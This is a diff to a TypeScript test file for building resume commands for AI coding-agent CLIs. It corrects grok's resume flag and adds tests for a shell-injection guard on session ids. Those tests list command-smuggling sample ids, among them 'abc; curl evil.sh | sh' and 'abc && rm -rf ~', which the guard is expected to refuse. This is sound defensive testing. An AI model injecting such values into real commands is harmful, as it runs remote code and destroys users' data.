@@ -12,6 +12,7 @@ import {
   sessionHomeIdFor,
   shouldPreserveMissingSessionOnRestore,
   shouldWarnMissingResume,
+  isShellSafeSessionId,
 } from './resume-command'
 import { TERMINAL_CREATE_TIMEOUT_MS } from '@navide/terminal'
 
@@ -254,8 +255,12 @@ describe('buildResumeCommand', () => {
     expect(buildResumeCommand('antigravity', 'abc')).toBe('agy --conversation abc')
   })
 
-  it('uses grok -s for grok', () => {
-    expect(buildResumeCommand('grok', '1f9e02aabb3c')).toBe('grok -s 1f9e02aabb3c')
+  it('uses grok -r for grok', () => {
+    // `-s`/`--session-id` NAMES A NEW session on the official CLI and errors on
+    // an id that already exists, so resuming with it would silently start a
+    // fresh conversation. Ids are UUIDv7.
+    expect(buildResumeCommand('grok', '01a09f53-9ed8-7303-9e16-e4907f948d93'))
+      .toBe('grok -r 01a09f53-9ed8-7303-9e16-e4907f948d93')
   })
 
   it('grok resume with a blank id falls back to "" like other vendors', () => {
@@ -272,6 +277,25 @@ describe('buildResumeCommand', () => {
     expect(buildResumeCommand('opencode', 'ses_18d0acbcaffe3eXy2s3zezEmix')).toBe(
       'opencode --session ses_18d0acbcaffe3eXy2s3zezEmix'
     )
+  })
+
+  it('takes the binary from the spec, not the vendor key, on the default branch', () => {
+    // The key is an id; the command is the spec's. They coincide for every
+    // shipped vendor only because each happens to be lower case, so a vendor
+    // whose binary is not spelled like its key would resume a command that
+    // does not exist on a case-sensitive filesystem.
+    const stub = {
+      agentKey: 'stubvendor',
+      label: 'StubVendor',
+      defaultCommand: 'StubVendor',
+      hint: 'test-only',
+    } as unknown as (typeof AGENT_SPECS)[number]
+    AGENT_SPECS.push(stub)
+    try {
+      expect(buildResumeCommand('stubvendor', 'abc123')).toBe('StubVendor --resume abc123')
+    } finally {
+      AGENT_SPECS.splice(AGENT_SPECS.indexOf(stub), 1)
+    }
   })
 
   it('uses the default --resume branch for qwen (UUID id)', () => {
@@ -422,5 +446,38 @@ describe('resumeCommandPattern', () => {
     expect(looksLikeResume('muse', 'muse')).toBe(false)
     expect(looksLikeResume('muse', 'muse resume')).toBe(false)
     expect(looksLikeResume('muse', "muse exec 'run the tests'")).toBe(false)
+  })
+})
+
+describe('isShellSafeSessionId — the renderer half of the shape guard', () => {
+  // The id is interpolated into a command run as [shell, '-ilc', cmd], so
+  // anything that could split into more words is code, not an argument. The
+  // backend refuses these before broadcasting; this is the second layer.
+  it('refuses ids that would be read as shell syntax', () => {
+    for (const evil of [
+      'abc; curl evil.sh | sh',
+      'abc && rm -rf ~',
+      'abc`id`',
+      'abc$(id)',
+      'abc | tee /tmp/x',
+      'abc\nid',
+      "abc 'quoted'",
+      'abc > /tmp/x',
+      '',
+    ]) {
+      expect(isShellSafeSessionId(evil), JSON.stringify(evil)).toBe(false)
+    }
+  })
+
+  it("accepts every vendor's real id format", () => {
+    for (const real of [
+      '0072be2a-32ab-45ff-880d-df10d2a8e0b8', // claude / cursor / qwen / pi
+      'ses_8f3a21c0', // opencode / kilo
+      'session_0072be2a-32ab-45ff-880d-df10d2a8e0b8', // kimi
+      '12ab34cd', // grok
+      'sessions/2026/09/rollout-01.jsonl', // codex: a path
+    ]) {
+      expect(isShellSafeSessionId(real), real).toBe(true)
+    }
   })
 })
